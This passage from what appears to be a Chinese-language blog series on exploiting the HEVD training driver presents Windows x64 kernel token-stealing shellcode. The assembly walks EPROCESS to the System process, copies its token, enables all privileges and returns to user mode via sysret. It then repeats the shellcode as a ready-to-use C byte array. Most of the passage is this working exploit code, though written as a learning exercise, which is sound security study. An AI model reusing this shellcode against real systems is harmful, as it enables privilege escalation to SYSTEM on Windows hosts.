<p>在设置<code>CR4.SMEP</code>的情况下，依靠内核分配的内存，成功运行了shellcode，ROP链进行了多次调用，让最后shellcode中的<code>rsp</code>值不好估计，并且栈的情况可能随着函数的调用将原有的值抹去，<strong>这里先把shellcode换成从TrapFrame返回的</strong></p>
<p><img src="https://img.joe1sn.top/uploads/big/39d57b872ac0473e469f8056ebedb9d3.png" alt="image-20240121095833438" /></p>
<h2 id="c-优化shellcode"><a class="markdownIt-Anchor" href="#c-优化shellcode"></a> C. 优化shellcode</h2>
<p>所以这段shellcode参考shellcode编写的C、D部分，加上了所有功能Enabled的shellcode片段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    mov     rax, gs:188h</span><br><span class="line">    mov     cx, [rax+1E4h]</span><br><span class="line">    inc     cx</span><br><span class="line">    mov     [rax+1E4h], cx</span><br><span class="line">    mov     rdx, [rax+90h]</span><br><span class="line">    mov     rcx, [rdx+168h]</span><br><span class="line">    mov     r11, [rdx+178h]</span><br><span class="line">    mov     rsp, [rdx+180h]</span><br><span class="line">    mov     rbp, [rdx+158h]</span><br><span class="line">    xor     eax, eax</span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret</span><br></pre></td></tr></table></figure>
<p>得到shellcode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">176</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line">	<span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF0</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x65</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/92433bde7fdb3c57a079ce6037669523.png" alt="image-20240121200156534" /></p>
<p>缺点就是程序无法exit退出，不过可以在shellcode中设置Token迁移等一些其他操作，这里就不展开了</p>
<h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1>
<p><a target="_blank" rel="noopener" href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">https://wumb0.in/finding-the-base-of-the-windows-kernel.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/">https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/</a></p>
<p><a target="_blank" rel="noopener" href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>
</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
(function () {
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__next" href="/2024/01/25/win-hevd-exp-stackoverflow-II/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2024 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>